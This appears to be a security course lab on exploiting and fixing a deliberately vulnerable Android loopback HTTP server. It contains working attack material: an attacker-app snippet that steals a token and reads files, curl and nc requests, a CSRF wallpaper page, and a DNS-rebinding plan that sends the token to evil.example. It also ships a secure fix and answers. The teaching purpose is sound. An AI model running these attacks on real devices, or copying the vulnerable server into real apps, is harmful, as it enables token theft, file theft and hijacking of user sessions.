# Lab 04 — The Localhost Service

**Difficulty:** Advanced
**Time:** 3–4 hours
**Prerequisites:** [Lab 01](lab-01-map-the-ipc-surface.md), [Lab 02](lab-02-abstract-socket.md),
[Chapter 24 §3.11](../README.md#311-localhost-network-sockets--an-app-listening-on-127001),
[23-Permissions](../../23-Permissions/README.md), [43-WebView](../../43-WebView/README.md)

---

## Objective

Find a loopback HTTP server in a running app, map its routes, exploit it from an attacker app that
holds **only `INTERNET`**, then escalate three ways: prove the same server is reachable from the
local network when it is bound to `0.0.0.0`, prove a **plain web page in a browser** can reach it with
no malicious app at all, and demonstrate the **DNS-rebinding** variant that defeats a naive
`Host`-header check. Finally, implement the four-part fix and verify each part independently.

## Why this matters

> **📖 Definition**
> **Loopback.** The virtual network interface `lo`, addresses `127.0.0.1` and `::1`. Traffic to it
> never leaves the device. It is a *network* interface, so a process needs the `INTERNET` permission
> to create a socket on it at all.

And there is the whole problem in one sentence: **`INTERNET` is `protectionLevel="normal"`.** It is
granted automatically at install time, it is never shown to the user, and essentially every app on
every device holds it. "We only listen on localhost" therefore means "we listen to every app on the
device", and the ticket price is a permission nobody has ever considered a permission.

There is a second failure hiding inside the first, and it catches experienced developers. `new
ServerSocket(8081)` and `NanoHTTPD(8081)` both bind **`0.0.0.0`** — every interface — not loopback.
On a device connected to WiFi, that server is reachable from the network as well. The developer who
wrote "it's only local" was wrong twice.

And a third, which is the one people find genuinely surprising: if the server speaks HTTP, then any
web page the user visits **in any browser** can issue requests to `http://127.0.0.1:<port>/`. That
requires no malicious app at all — just a page the user opens. Simple `GET` endpoints with side
effects are then reachable by cross-site request forgery, and DNS rebinding defeats the obvious
`Host`-header defence.

Local HTTP servers exist for good reasons: letting a `WebView` load app-generated content over
`http://` so relative URLs and `XMLHttpRequest` behave normally, letting `ExoPlayer` consume a stream
the app produces, giving QA a way to poke at internal state. Every one is a legitimate engineering
need. The failure is assuming loopback is a trust boundary. It is a shared bus.

---

## Setup

### The victim app

Package `com.iplab.local`. A local control server, based on a pattern that recurs in the wild.

```java
package com.iplab.local;

import fi.iki.elonen.NanoHTTPD;      // implementation 'org.nanohttpd:nanohttpd:2.3.1'
import java.io.*;

public class LocalControlServer extends NanoHTTPD {

    // NanoHTTPD(int) binds 0.0.0.0 — ALL interfaces. Not loopback.
    public LocalControlServer() { super(8081); }

    @Override public Response serve(IHTTPSession session) {
        String uri = session.getUri();

        if (uri.equals("/token")) {
            return newFixedLengthResponse(Session.get().token());
        }
        if (uri.equals("/debug/setUser")) {
            String id = session.getParms().get("id");
            Session.get().switchUser(id);                     // no auth at all
            return newFixedLengthResponse("ok");
        }
        if (uri.startsWith("/file")) {
            String p = session.getParms().get("path");
            try {
                return newChunkedResponse(Response.Status.OK,
                        "application/octet-stream", new FileInputStream(p));
            } catch (FileNotFoundException e) {
                return newFixedLengthResponse(Response.Status.NOT_FOUND,
                        "text/plain", "no");
            }
        }
        return newFixedLengthResponse(Response.Status.NOT_FOUND, "text/plain", "no");
    }
}
```

```java
package com.iplab.local;

public class Session {
    private static final Session I = new Session();
    private String user = "alice";
    public static Session get() { return I; }
    public String token() { return "LAB_LOCALHOST_TOKEN_9f8e7d"; }
    public void switchUser(String id) { user = id; }
    public String user() { return user; }
}
```

Start it from `MainActivity.onCreate()`, and write a file worth stealing:

```java
File f = new File(getFilesDir(), "session.xml");
try (Writer w = new FileWriter(f)) { w.write("<session token=\"LAB_LOCALHOST_TOKEN_9f8e7d\"/>"); }
new LocalControlServer().start();
```

The manifest needs exactly one permission, and — note this — nothing else:

```xml
<uses-permission android:name="android.permission.INTERNET" />
```

### The attacker app

[`../examples/attacker-app/`](../examples/attacker-app/README.md) already probes a list of common
ports and prints the banner. It declares `INTERNET` and nothing else.

```bash
# host
adb install -r local.apk
adb install -r attacker.apk
adb shell am start -n com.iplab.local/.MainActivity
```

---

## Steps

### Step 1 — Find it, from first principles

Do not start with `netstat`. Learn the file it reads.

```bash
# adb shell
cat /proc/net/tcp
cat /proc/net/tcp6
```

```bash
# adb shell — just the listeners
awk 'NR>1 && $4=="0A" {print $2, $8, $10}' /proc/net/tcp
```

**Q1.** Decode the `local_address` of your victim's socket by hand. What is the port, and what is the
IP? Show the byte reversal.

**Q2.** Map the `uid` column to a package. Which command does that, and why is this route better than
relying on `netstat`'s process column on Android?

```bash
# adb shell
cmd package list packages --uid 10xxx
```

**Q3.** Take a before/after diff around app launch. Why is that more useful than a single snapshot?

```bash
# adb shell
netstat -tulpn > /data/local/tmp/before.txt
monkey -p com.iplab.local -c android.intent.category.LAUNCHER 1
sleep 5
netstat -tulpn > /data/local/tmp/after.txt
diff /data/local/tmp/before.txt /data/local/tmp/after.txt
```

### Step 2 — Characterise the server

```bash
# adb shell
curl -s -i http://127.0.0.1:8081/
curl -s http://127.0.0.1:8081/token
curl -s "http://127.0.0.1:8081/file?path=/data/data/com.iplab.local/files/session.xml"
curl -s "http://127.0.0.1:8081/debug/setUser?id=999"
```

If `curl` is absent, `../scripts/abstract-socket-probe.py` will not help — this is TCP — so use
`adb forward`:

```bash
# host
adb forward tcp:18081 tcp:8081
curl -s http://127.0.0.1:18081/token
```

**Q4.** Enumerate the routes. Which are read-only, which change state, and which are file access?

**Q5.** `/file?path=` reads a file **with the victim's UID**. What class of vulnerability is that, and
whose authority performs the read? Which section of the chapter is that the same idea as?

### Step 3 — Prove it from an ordinary app

```bash
# host
adb logcat -c
adb shell am start -n com.attacker.poc/.ProbeActivity \
    --es target com.iplab.local --es only localhost
adb logcat -s poc:I
```

Then extend the probe (or write four lines by hand) to hit the interesting routes:

```java
// Attacker app — manifest needs ONLY <uses-permission android:name="android.permission.INTERNET"/>
URL u = new URL("http://127.0.0.1:8081/token");
String token = new BufferedReader(new InputStreamReader(
        ((HttpURLConnection) u.openConnection()).getInputStream())).readLine();
Log.i("poc", "STOLEN TOKEN: " + token);

URL f = new URL("http://127.0.0.1:8081/file?path="
              + "/data/data/com.iplab.local/files/session.xml");
InputStream in = ((HttpURLConnection) f.openConnection()).getInputStream();
```

**Q6.** How many permissions did the attack need? What is the protection level of the one you used,
and when was the user informed about it?

**Q7.** Compare this to Lab 02's abstract socket. Which surface has the lower cost of entry for an
attacker, and which is harder for a developer to notice?

### Step 4 — Escalation 1: the network

```bash
# adb shell
ip addr show wlan0 | grep "inet "
```

```bash
# host — from your laptop, on the same WiFi
curl -s http://<device-ip>:8081/token
```

**Q8.** Did that work? Which line of `LocalControlServer` is responsible? Rewrite that line to bind
loopback only, rebuild, and confirm the network request now fails while the on-device one still
works.

**Q9.** How much does the severity change when a finding moves from "any app on the device" to "any
host on the network"? What does the attacker no longer need?

### Step 5 — Escalation 2: the browser, with no app at all

Restore the `0.0.0.0` binding for now. Serve this page from your laptop and open it in the device's
browser:

```html
<!-- attacker page, hosted anywhere -->
<h1>Free Wallpapers</h1>
<img src="http://127.0.0.1:8081/debug/setUser?id=999" width="1" height="1">
<script>
  // A simple no-cors POST/GET still reaches the server even though the
  // response is opaque to the page. State changes do not need a readable reply.
  fetch('http://127.0.0.1:8081/debug/setUser?id=1337', {mode: 'no-cors'});
</script>
```

```bash
# adb shell — confirm the state actually changed
logcat -s local:I
curl -s http://127.0.0.1:8081/token
```

**Q10.** The browser could not *read* the response — the same-origin policy stopped that. Why did the
attack still succeed? What property of the endpoint made the unreadable response irrelevant?

**Q11.** Now try to *read* `/token` from the page with `fetch()` in `cors` mode. What happens, and
what would the server have to send for it to succeed? Check whether NanoHTTPD's defaults send it.

### Step 6 — Escalation 3: DNS rebinding

The obvious defence is to check the `Host` header. Show why that is not enough on its own.

> **📖 Definition**
> **DNS rebinding.** An attacker controls a domain. On the first lookup it resolves to the attacker's
> server, which serves the page. Shortly afterwards, with a very low TTL, the same name resolves to
> `127.0.0.1`. The browser now believes `http://evil.example/` and `http://127.0.0.1:8081/` are the
> **same origin**, so the same-origin policy permits the page to read responses from the local
> service.

Set up the demonstration:

1. Configure a hostname you control with a 1-second TTL, or use a public rebinding service on a lab
   network you own.
2. Serve a page that waits, then fetches `http://<yourhost>:8081/token` and exfiltrates the body.
3. Open it on the device.

If you cannot run real DNS, simulate the outcome by adding a hosts entry on the device and confirming
the request arrives with `Host: yourhost` rather than `Host: 127.0.0.1`.

**Q12.** What does the server see in the `Host` header during a rebinding attack? Why does a check for
`Host: 127.0.0.1` stop it, and why is it wrong to rely on that check alone?

**Q13.** Which of the four fix elements in Step 7 would have stopped rebinding even with no `Host`
check at all? Why is that the more robust control?

### Step 7 — The fix, in four independent parts

```java
// FIXED — all four elements matter, and each stops something different.
public final class LocalServer extends NanoHTTPD {
    private final String secret;      // 32 bytes of SecureRandom, per launch

    public LocalServer(String secret) throws IOException {
        super("127.0.0.1", 0);        // (1) loopback only  (2) ephemeral port
        this.secret = secret;
    }

    @Override public Response serve(IHTTPSession s) {
        String auth = s.getHeaders().get("authorization");
        if (auth == null || !MessageDigest.isEqual(                    // (3)
                auth.getBytes(UTF_8), ("Bearer " + secret).getBytes(UTF_8))) {
            return newFixedLengthResponse(Response.Status.FORBIDDEN, "text/plain", "");
        }
        String host = s.getHeaders().get("host");                      // (4)
        if (host == null || !host.startsWith("127.0.0.1")) {
            return newFixedLengthResponse(Response.Status.FORBIDDEN, "text/plain", "");
        }
        return route(s);              // and no /debug routes in a release build
    }
}
```

Apply them **one at a time** and re-run every attack after each.

| Fix element | Stops | Does not stop |
|---|---|---|
| (1) bind `127.0.0.1` | | |
| (2) ephemeral port | | |
| (3) per-launch bearer secret | | |
| (4) `Host` header validation | | |

**Q14.** Fill in the table from your own test results, not from reasoning. Which single element does
the most work?

**Q15.** How does the app's own `WebView` learn the ephemeral port and the secret without either
leaking? Where must the secret *not* go? (Consider: `Log`, the clipboard, a broadcast, a URL query
string, and `SharedPreferences`.)

**Q16.** The `/debug` routes should not exist in a release build. Why is `src/debug/java/` a better
answer than `if (BuildConfig.DEBUG)`? What can a tester do with the second that they cannot with the
first?

### Step 8 — Write it up

Produce a finding containing: the port, the **binding address**, the exact requests, the identity you
sent them from, the network-reachability result, the browser result, the device fingerprint, the
`targetSdk`, and the fix as code.

**Q17.** Write the sentence that distinguishes "reachable by any app on the device" from "reachable
from the local network". Why must a report state both explicitly rather than merging them?

---

## Hints

<details>
<summary>Hint 1 — no `curl` on the device</summary>

Many Android builds have no `curl` and no `wget`. Three alternatives:

```bash
# host — forward and use your own tools
adb forward tcp:18081 tcp:8081
curl -s http://127.0.0.1:18081/token
```

```bash
# adb shell — toybox nc, if present
echo -e "GET /token HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n" | nc 127.0.0.1 8081
```

Or push a small Python script. Remember: everything you do through `adb forward` runs as adbd, so it
proves the port is open, not that an app can reach it.
</details>

<details>
<summary>Hint 2 — the port is not in the common list</summary>

The probe app scans a fixed list. Read the real port from `/proc/net/tcp` and add it, or better, get
it from the code:

```bash
# host
grep -rnE "new ServerSocket\(|NanoHTTPD|InetSocketAddress\(" out/sources/
```

Note that a well-fixed app uses an **ephemeral** port — `super("127.0.0.1", 0)` — so the port changes
every launch and cannot be scanned for reliably. That is the point of fix element (2), and it is why
it is worth measuring how much it actually buys.
</details>

<details>
<summary>Hint 3 — the browser attack does nothing visible</summary>

You are looking for a **state change**, not a response. Confirm from the server side:

```bash
# adb shell
logcat -s local:I
curl -s http://127.0.0.1:8081/token    # or whatever reflects the changed state
```

Also check that the device's browser is not blocking `http://` from an `https://` page — mixed
content. Serve the attacker page over plain `http` for the demonstration and say so in your notes.
</details>

<details>
<summary>Hint 4 — cleartext traffic is blocked</summary>

From Android 9 (API 28), cleartext HTTP is blocked by default for apps targeting 28+. Loopback is
frequently exempted, and a network security config can allow it explicitly:

```xml
<network-security-config>
    <domain-config cleartextTrafficPermitted="true">
        <domain includeSubdomains="false">127.0.0.1</domain>
    </domain-config>
</network-security-config>
```

If the attacker app cannot reach loopback over `http`, this is why. See
[44-NetworkSecurityConfig](../../44-NetworkSecurityConfig/README.md).
</details>

<details>
<summary>Hint 5 — I cannot set up real DNS rebinding</summary>

You do not need real DNS to make the point. Two substitutes:

1. Send a request with a forged `Host` header directly and observe that the server does not care:
   `curl -s -H "Host: evil.example" http://127.0.0.1:8081/token`. That is precisely what a rebound
   request looks like to the server.
2. Add a hosts entry mapping a name to `127.0.0.1` on the device and browse to it. The security
   property you are demonstrating — the server accepting a request whose `Host` is not the loopback
   literal — is identical.
</details>

---

## Solution

<details>
<summary>Answers</summary>

**Q1–Q3.** `0100007F:1F90` reverses to `7F 00 00 01` = `127.0.0.1`, port `0x1F90` = 8081.
`00000000:1F90` is `0.0.0.0:8081` — all interfaces. Map the owner with `cmd package list packages
--uid <uid>`; that route works without root, whereas `netstat`'s process column is frequently blank on
Android because it needs privileges plain `adb shell` may not have. The before/after diff attributes a
socket to a **feature**, not merely to an app, which is what lets you tell a developer where in their
code to look.

**Q4–Q5.** `/token` is read-only disclosure; `/debug/setUser` is an unauthenticated state change;
`/file?path=` is arbitrary file read **performed with the victim's UID**. That last one is a confused
deputy: the attacker cannot read `/data/data/com.iplab.local/...`, but the victim can, and the victim
does it on request. Same shape as §3.20, different transport.

**Q6–Q7.** One permission: `INTERNET`, protection level `normal`, granted silently at install with no
user-visible prompt ever. The abstract socket in Lab 02 has an even lower cost — *zero* permissions —
but the localhost server is usually harder for a developer to notice, because "it's on localhost"
sounds like a security property and "it's a LocalServerSocket" at least mentions a socket. Both are
invisible in the manifest.

**Q8–Q9.** `super(8081)` — the `NanoHTTPD(int)` constructor — binds all interfaces. Changing it to
`super("127.0.0.1", 8081)` makes the network request fail while the on-device one still works.
Severity rises at least one level when a finding moves off-device, because the attacker no longer
needs the user to install anything: proximity to the network is enough, and on a public or corporate
WiFi that is a much larger population than "users who installed a malicious app".

**Q10–Q11.** The `img` and `no-cors` `fetch` succeed because the **request is sent** regardless of
whether the response can be read. A state-changing `GET` needs no readable reply, which is why
side-effecting `GET` endpoints are the classic CSRF target. A `cors`-mode `fetch` of `/token` fails at
the response stage unless the server sends `Access-Control-Allow-Origin`. NanoHTTPD does not send CORS
headers by default — but check, because many apps add a permissive `*` to make their own WebView work,
and that single header converts an unreadable request into full data theft from any web page.

**Q12–Q13.** During rebinding the server sees `Host: evil.example`, not `Host: 127.0.0.1` — which is
exactly why the `Host` check works. But it is a *string* check on an attacker-influenced header, it
breaks if the app ever needs another hostname, and it is one refactor away from being removed. The
**per-launch bearer secret** (element 3) stops rebinding regardless: the page has no way to learn the
secret, so it cannot produce an acceptable request whatever the `Host` says. Authentication is the
robust control; the `Host` check is defence in depth.

**Q14.** Measured results should show: (1) kills all off-device access, nothing else; (2) raises the
cost of discovery but stops nothing determined, since an app can read `/proc/net/tcp` and find the
port in milliseconds; (3) kills every unauthenticated attack from apps and from browsers alike; (4)
kills the browser and rebinding paths but nothing from an app, which can set any `Host` it likes. The
element doing the most work is **(3), the secret** — and that ranking is the lesson: the network-level
controls shape the attack surface, but only authentication removes the capability.

**Q15.** The app injects the secret and the port into the page it loads, in-process — typically by
constructing the URL with the port and adding the `Authorization` header through
`WebViewClient.shouldInterceptRequest`, or by passing them through a `@JavascriptInterface` bound
before any remote content loads. The secret must never appear in: `Log` (readable by other apps on
older versions, and by anyone with the device), the clipboard, any broadcast, a URL query string
(which lands in history, `Referer` headers and server logs), or `SharedPreferences` that outlive the
launch. It is per-launch precisely so that leaking it once does not create a permanent hole.

**Q16.** `if (BuildConfig.DEBUG)` leaves the debug code **in the release DEX**. It can be reached by
patching one branch, by hooking `BuildConfig.DEBUG` with Frida, or by a logic error elsewhere that
sets the flag. A `src/debug/java/` source set means the class is not compiled into the release build
at all, so there is nothing to patch and nothing to hook. A tester can trivially flip a boolean; they
cannot conjure absent bytecode.

**Q17.** Model sentence: *"The service listening on `0.0.0.0:8081` is reachable by any application on
the device holding `INTERNET` — a permission granted silently at install to effectively every app —
**and** by any host on the same network segment, with no application installed on the device at all.
The second condition removes the requirement for user action entirely."* The two claims have
different attacker populations and different prerequisites, so merging them either overstates the
first or hides the second.

</details>

---

## Success criteria

- [ ] You found the listener from `/proc/net/tcp` and decoded the address by hand
- [ ] You mapped the owning UID back to a package without relying on `netstat`
- [ ] You used a before/after diff to attribute the socket to a specific app feature
- [ ] You enumerated every route and classified each as read, state-change or file access
- [ ] You exploited it from an app declaring only `INTERNET`, and captured the token
- [ ] You demonstrated the arbitrary file read and identified whose authority performed it
- [ ] You proved network reachability from a second host, then killed it by changing the bind address
- [ ] You triggered a state change from a **plain web page**, with no app installed
- [ ] You determined whether the server sends CORS headers, and what would change if it did
- [ ] You demonstrated or faithfully simulated DNS rebinding and explained what the server sees
- [ ] You applied the four fix elements **one at a time** and measured what each one stops
- [ ] You can state which single element does the most work, and why
- [ ] You can explain why a debug source set beats a `BuildConfig.DEBUG` check
- [ ] Your write-up states the port, the binding address and both attacker populations separately
